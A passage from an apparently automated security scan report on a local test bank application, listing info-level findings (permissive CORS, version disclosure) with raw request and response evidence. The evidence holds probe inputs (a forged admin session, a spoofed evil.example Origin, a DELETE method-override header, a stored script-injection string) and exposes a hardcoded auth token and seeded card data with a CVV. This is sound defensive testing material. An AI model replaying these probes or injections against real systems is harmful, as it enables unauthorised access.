                <div><span class="font-semibold text-dark-800">Machine Auth Token:</span> <span id="setting-machine-token" class="text-dark-500">mch_face_insurance_secret_key_2026</span></div>
              </div>
              <button type="submit" id="save-settings-btn" class="bg-dark-900 hover:bg-dark-800 text-white font-semibold px-6 py-2.5 rounded-xl transition-colors text-sm flex items-center justify-center gap-2 disabled:opacity-50">
                <span>Save Settings</span>
                <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
              </button>
            </form>
          </div>

          <!-- Reset Database Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-red-200 p-6 sm:p-8 max-w-xl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">Reset Database</h2>
                <p class="text-sm text-dark-500">Drop and recreate the entire database with seed data</p>
              </div>
            </div>
            <div class="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
              <p class="text-red-800 text-sm font-medium">Warning: This action is irreversible</p>
              <p class="text-red-600 text-xs mt-1">All customer data, accounts, and transactions will be permanently deleted and replaced with default seed data.</p>
            </div>
            <p class="text-sm text-dark-600 mb-3">Type <strong>RESET</strong> below to confirm:</p>
            <input type="text" id="reset-confirm-input" class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition font-mono tracking-widest text-center text-lg mb-4" placeholder="Type RESET">
            <button id="reset-btn" onclick="BankOfEdAdmin.SystemPage.handleReset()" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
              <span>Reset Database</span>
              <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
            </button>
          </div>
        </section>

      </div>
    </main>
  </div>

  <!-- Scripts -->
  <script src="js/utils.js"></script>
  <script src="js/api.js"></script>
  <script src="js/router.js"></script>
  <script src="js/pages/auth.js"></script>
  <script src="js/pages/customers.js"></script>
  <script src="js/pages/accounts.js"></script>
  <script src="js/pages/system.js"></script>
  <script src="js/pages/fx-rates.js"></script>
  <script src="js/app.js"></script>
</body>
</html>
```

### Request Evidence
```
GET http://localhost:8081/admin/#/customers/11
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 13:34:23 GMT
server: Apache/2.4.68 (Unix)
last-modified: Sun, 23 Aug 2026 12:34:31 GMT
etag: "4c9c-659b6175aa3c0"
accept-ranges: bytes
content-length: 19612
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Bank of Ed - Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            dark: {
              50: '#f4f4f5', 100: '#e4e4e7', 200: '#d4d4d8', 300: '#a1a1aa',
              400: '#71717a', 500: '#52525b', 600: '#3f3f46', 700: '#27272a',
              800: '#18181b', 900: '#09090b', 950: '#030305'
            }
          },
          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
        }
      }
    }
  </script>
  <link rel="stylesheet" href="css/app.css">
</head>
<body class="bg-dark-50 font-sans text-dark-800">

  <!-- Toast Container -->
  <div id="toast-container" class="fixed top-4 right-4 z-50 space-y-2"></div>

  <!-- Modal Overlay -->
  <div id="modal-overlay" class="hidden fixed inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
    <div id="modal-content" class="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto"></div>
  </div>

  <!-- ===================== AUTH VIEW ===================== -->
  <div id="view-auth" class="hidden min-h-screen flex items-center justify-center bg-gradient-to-br from-dark-900 via-dark-800 to-dark-950 p-4">
    <div class="w-full max-w-md">
      <div class="text-center mb-8">
        <div class="inline-flex items-center gap-3">
          <div class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center">
            <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          </div>
          <h1 class="text-3xl font-bold text-white">The Bank of Ed</h1>
        </div>
        <p class="text-dark-400 mt-2">Administration Panel</p>
      </div>

      <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8">
        <form id="login-form" onsubmit="BankOfEdAdmin.AuthPage.handleLogin(event)">
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Username</label>
              <input type="text" name="username" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="admin" autofocus>
            </div>
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Password</label>
              <input type="password" name="password" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="Enter password">
            </div>
          </div>
          <div id="login-errors" class="mt-4 text-sm text-red-600 hidden"></div>
          <button type="submit" class="w-full mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2">
            <span>Sign In</span>
            <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
          </button>
        </form>
      </div>
    </div>
  </div>

  <!-- ===================== APP SHELL ===================== -->
  <div id="app-shell" class="hidden flex h-screen overflow-hidden">

    <!-- Mobile Header -->
    <div class="lg:hidden fixed top-0 left-0 right-0 z-30 bg-dark-900 text-white flex items-center justify-between px-4 py-3">
      <button onclick="BankOfEdAdmin.App.toggleSidebar()" class="p-2 hover:bg-dark-800 rounded-lg">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
      </button>
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <span class="font-semibold">Admin</span>
      </div>
      <div class="w-10"></div>
    </div>

    <!-- Sidebar Overlay (mobile) -->
    <div id="sidebar-overlay" onclick="BankOfEdAdmin.App.toggleSidebar()" class="hidden fixed inset-0 z-30 bg-black/50 lg:hidden"></div>

    <!-- Sidebar -->
    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 z-40 w-64 bg-dark-900 text-white flex flex-col transform -translate-x-full lg:translate-x-0 transition-transform duration-200">
      <div class="p-6 flex items-center gap-3">
        <div class="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <div>
          <h2 class="font-bold text-lg">The Bank of Ed</h2>
          <p class="text-xs text-dark-400">Admin Panel</p>
        </div>
      </div>

      <nav class="flex-1 px-3 space-y-1 mt-2">
        <a href="#/customers" data-nav="customers" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          <span>Customers</span>
        </a>
        <a href="#/accounts" data-nav="accounts" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
          <span>Accounts</span>
        </a>
        <a href="#/fx-rates" data-nav="fx-rates" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
          <span>FX Rates</span>
        </a>
        <a href="#/system" data-nav="system" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
          <span>System</span>
        </a>
      </nav>

      <div class="p-4 border-t border-dark-800">
        <div class="flex items-center gap-3 mb-3 px-2">
          <div class="w-9 h-9 bg-dark-700 rounded-full flex items-center justify-center text-sm font-semibold" id="sidebar-avatar">A</div>
          <div class="min-w-0">
            <p class="text-sm font-medium truncate" id="sidebar-admin-name">Admin</p>
          </div>
        </div>
        <button onclick="BankOfEdAdmin.App.logout()" class="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-dark-400 hover:text-red-400 hover:bg-dark-800 transition-colors text-sm">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
          <span>Sign Out</span>
        </button>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 overflow-y-auto pt-14 lg:pt-0">
      <div class="p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto">

        <!-- Customers List -->
        <section id="page-customers" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">Customers</h1>
              <p class="text-dark-500 mt-1">Manage customer accounts</p>
            </div>
            <div class="flex items-center gap-3">
              <input type="text" id="customer-search" placeholder="Search..." class="px-4 py-2.5 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm w-48" onkeyup="BankOfEdAdmin.CustomersPage.handleSearch(event)">
            </div>
          </div>
          <div id="customers-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="customers-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- Customer Detail -->
        <section id="page-customer-detail" class="hidden">
          <a href="#/customers" class="inline-flex items-center gap-1 text-red-600 hover:text-red-700 text-sm font-medium mb-6">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
            Back to Customers
          </a>
          <div id="customer-detail-content"></div>
        </section>

        <!-- Accounts -->
        <section id="page-accounts" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">All Accounts</h1>
            <p class="text-dark-500 mt-1">View and manage all bank accounts</p>
          </div>
          <div id="accounts-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="accounts-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- FX Rates -->
        <section id="page-fx-rates" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">FX Rates</h1>
              <p class="text-dark-500 mt-1">Manage foreign exchange rates</p>
            </div>
            <button onclick="BankOfEdAdmin.FxRatesPage.showAddModal()" class="bg-red-600 hover:bg-red-700 text-white font-semibold px-5 py-2.5 rounded-xl transition-colors text-sm flex items-center gap-2">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
              Add Rate
            </button>
          </div>
          <div id="fx-rates-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
        </section>

        <!-- System -->
        <section id="page-system" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">System Management</h1>
            <p class="text-dark-500 mt-1">Integration settings, database operations and maintenance</p>
          </div>

          <!-- White-Label Partner Settings Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-dark-100 p-6 sm:p-8 max-w-xl mb-6">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">FACE Insurance Integration</h2>
                <p class="text-sm text-dark-500">Configure target URL for White-Label Insurance SSO</p>
              </div>
            </div>
            <form id="insurance-settings-form" onsubmit="BankOfEdAdmin.SystemPage.saveSettings(event)" class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-dark-700 mb-1.5">FACE Insurance Base URL</label>
                <input type="url" id="setting-insurance-url" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm" placeholder="http://localhost:8001">
                <p class="text-xs text-dark-400 mt-1.5">When customers click Insurance, they will be redirected to this URL with an SSO assertion token.</p>
              </div>
              <div class="p-3.5 bg-dark-50 rounded-xl text-xs text-dark-600 space-y-1 font-mono">
                <div><span class="font-semibold text-dark-800">Merchant ID:</span> <span id="setting-merchant-id">faceinsurance</span></div>
                <div><span class="font-semibold text-dark-800">Settlement Account:</span> <span id="setting-merchant-account">062-001 88880001 (face@example.com)</span></div>
                <div><span class="font-semibold text-dark-800">Machine Auth Token:</span> <span id="setting-machine-token" class="text-dark-500">mch_face_insurance_secret_key_2026</span></div>
              </div>
              <button type="submit" id="save-settings-btn" class="bg-dark-900 hover:bg-dark-800 text-white font-semibold px-6 py-2.5 rounded-xl transition-colors text-sm flex items-center justify-center gap-2 disabled:opacity-50">
                <span>Save Settings</span>
                <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
              </button>
            </form>
          </div>

          <!-- Reset Database Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-red-200 p-6 sm:p-8 max-w-xl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">Reset Database</h2>
                <p class="text-sm text-dark-500">Drop and recreate the entire database with seed data</p>
              </div>
            </div>
            <div class="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
              <p class="text-red-800 text-sm font-medium">Warning: This action is irreversible</p>
              <p class="text-red-600 text-xs mt-1">All customer data, accounts, and transactions will be permanently deleted and replaced with default seed data.</p>
            </div>
            <p class="text-sm text-dark-600 mb-3">Type <strong>RESET</strong> below to confirm:</p>
            <input type="text" id="reset-confirm-input" class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition font-mono tracking-widest text-center text-lg mb-4" placeholder="Type RESET">
            <button id="reset-btn" onclick="BankOfEdAdmin.SystemPage.handleReset()" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
              <span>Reset Database</span>
              <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
            </button>
          </div>
        </section>

      </div>
    </main>
  </div>

  <!-- Scripts -->
  <script src="js/utils.js"></script>
  <script src="js/api.js"></script>
  <script src="js/router.js"></script>
  <script src="js/pages/auth.js"></script>
  <script src="js/pages/customers.js"></script>
  <script src="js/pages/accounts.js"></script>
  <script src="js/pages/system.js"></script>
  <script src="js/pages/fx-rates.js"></script>
  <script src="js/app.js"></script>
</body>
</html>
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 50. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-074
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/admin/customers/10
- CVSS: 0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:N)

### Description
The API returns Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true and permits all request headers.

### Impact
Public API responses may be readable from arbitrary origins. Browsers normally reject credentialed wildcard-origin responses, so authenticated cross-origin data access was not demonstrated.

### Likelihood
The configuration is confirmed, but this probe received only a 401 response and did not prove access to sensitive data.

### Recommendation
Allow only trusted origins, return Access-Control-Allow-Credentials only when required, and restrict allowed methods and headers to those the API uses.

### Evidence
```
The 401 API response included Access-Control-Allow-Origin: *, Access-Control-Allow-Credentials: true, Access-Control-Allow-Headers: *, and broad allowed methods.

REQUEST:
GET http://localhost:8081/api/admin/customers/10
use_session: fresh_forged_admin  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 401
date: Tue, 08 Sep 2026 13:32:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Request Evidence
```
GET http://localhost:8081/api/admin/customers/10
use_session: fresh_forged_admin  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 401
date: Tue, 08 Sep 2026 13:32:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 51. Server and runtime versions are disclosed

- Finding reference: URBN-057
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
API responses disclose the exact Apache and PHP versions through the Server and X-Powered-By headers.

### Impact
The information can help attackers identify version-specific vulnerabilities, but it does not demonstrate direct compromise.

### Likelihood
High for discovery because the headers are returned to anonymous requests. Direct security impact is informational.

### Recommendation
Suppress the X-Powered-By header and configure Apache to return a minimal Server header. Keep both components patched.

### Evidence
```
The anonymous login response included Server: Apache/2.4.68 (Unix) and X-Powered-By: PHP/8.4.25.

REQUEST:
GET http://localhost:8081/api/auth/login
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}

RESPONSE:
Status: 405
date: Tue, 08 Sep 2026 13:13:54 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Request Evidence
```
GET http://localhost:8081/api/auth/login
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}
```

### Response Evidence
```
Status: 405
date: Tue, 08 Sep 2026 13:13:54 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 52. Server and runtime versions are disclosed

- Finding reference: URBN-059
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
API responses disclose the exact Apache and PHP versions through Server and X-Powered-By headers.

### Impact
The information can help an attacker identify version-specific weaknesses, but it does not establish that either component is vulnerable.

### Likelihood
The version information is returned to remote callers on normal API responses.

### Recommendation
Suppress detailed Server and X-Powered-By headers or replace them with generic values.

### Evidence
```
The response headers disclosed Server: Apache/2.4.68 (Unix) and X-Powered-By: PHP/8.4.25.

REQUEST:
GET http://localhost:8081/api/accounts
use_session: configured_primary  Authorization: present
Cookies: none
{"X-HTTP-Method-Override": "DELETE"}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 12:59:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 1011
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":[{"id":1,"bsb":"062-001","account_number":"10000001","account_type":"transaction","account_name":"Everyday Account","currency":"AUD","balance":"3450.75","is_active":true},{"id":2,"bsb":"062-001","account_number":"10000002","account_type":"transaction","account_name":"Savings Account","currency":"AUD","balance":"18900.00","is_active":true},{"id":3,"bsb":"062-001","account_number":"10000003","account_type":"loan","account_name":"Home Loan","currency":"AUD","balance":"-285000.00","is_active":true},{"id":51,"bsb":"062-001","account_number":"10000004","account_type":"credit_card","account_name":"Platinum Credit Card","currency":"AUD","balance":"25000.00","is_active":true,"card_number":"4532015001345674","card_expiry":"08\/29","card_cvv":"842","credit_limit":"25000.00"},{"id":101,"bsb":"062-001","account_number":"10593296","account_type":"transaction","account_name":"');document.body.dataset.aespa='xss007';\/\/","currency":"AUD","balance":"0.00","is_active":true}],"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/accounts
use_session: configured_primary  Authorization: present
Cookies: none
{"X-HTTP-Method-Override": "DELETE"}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 12:59:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 1011
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":[{"id":1,"bsb":"062-001","account_number":"10000001","account_type":"transaction","account_name":"Everyday Account","currency":"AUD","balance":"3450.75","is_active":true},{"id":2,"bsb":"062-001","account_number":"10000002","account_type":"transaction","account_name":"Savings Account","currency":"AUD","balance":"18900.00","is_active":true},{"id":3,"bsb":"062-001","account_number":"10000003","account_type":"loan","account_name":"Home Loan","currency":"AUD","balance":"-285000.00","is_active":true},{"id":51,"bsb":"062-001","account_number":"10000004","account_type":"credit_card","account_name":"Platinum Credit Card","currency":"AUD","balance":"25000.00","is_active":true,"card_number":"4532015001345674","card_expiry":"08\/29","card_cvv":"842","credit_limit":"25000.00"},{"id":101,"bsb":"062-001","account_number":"10593296","account_type":"transaction","account_name":"');document.body.dataset.aespa='xss007';\/\/","currency":"AUD","balance":"0.00","is_active":true}],"message":"OK"}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 53. Server and runtime versions are disclosed

- Finding reference: URBN-062
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/auth/register
